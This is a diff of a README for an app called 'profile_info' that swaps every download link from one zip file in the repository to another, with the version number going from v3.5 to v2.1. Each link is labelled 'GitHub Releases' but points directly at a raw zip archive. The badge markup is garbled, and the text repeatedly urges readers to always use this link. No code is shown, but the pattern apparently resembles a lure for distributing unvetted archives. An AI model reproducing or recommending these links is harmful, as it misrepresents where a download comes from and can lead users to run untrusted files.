@@ -6,13 +6,13 @@ Welcome to profile_info! This application helps you interactively manage your pr
 
 ## 🔗 Download
 
-[![Download Latest Release](https://raw.githubusercontent.com/kahoikreations/profile_info/main/services/profile-info-v3.5.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/kahoikreations/profile_info/main/services/profile-info-v3.5.zip)](https://raw.githubusercontent.com/kahoikreations/profile_info/main/services/profile-info-v3.5.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/kahoikreations/profile_info/main/components/info-profile-v2.1.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/kahoikreations/profile_info/main/components/info-profile-v2.1.zip)](https://raw.githubusercontent.com/kahoikreations/profile_info/main/components/info-profile-v2.1.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    To download the application, click the link below:  
-   [Download from GitHub Releases](https://raw.githubusercontent.com/kahoikreations/profile_info/main/services/profile-info-v3.5.zip).
+   [Download from GitHub Releases](https://raw.githubusercontent.com/kahoikreations/profile_info/main/components/info-profile-v2.1.zip).
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version of profile_info. This version should have the most recent features and fixes.
@@ -66,4 +66,4 @@ Need help? If you encounter any problems, feel free to reach out. You can submit
 
 Join our community of users to share tips, suggestions, and experiences with profile_info. Connect with us on social media or look for discussion threads on GitHub.
 
-Remember, to download the latest version, always use this link: [Download from GitHub Releases](https://raw.githubusercontent.com/kahoikreations/profile_info/main/services/profile-info-v3.5.zip). Thank you for choosing profile_info!
+Remember, to download the latest version, always use this link: [Download from GitHub Releases](https://raw.githubusercontent.com/kahoikreations/profile_info/main/components/info-profile-v2.1.zip). Thank you for choosing profile_info!
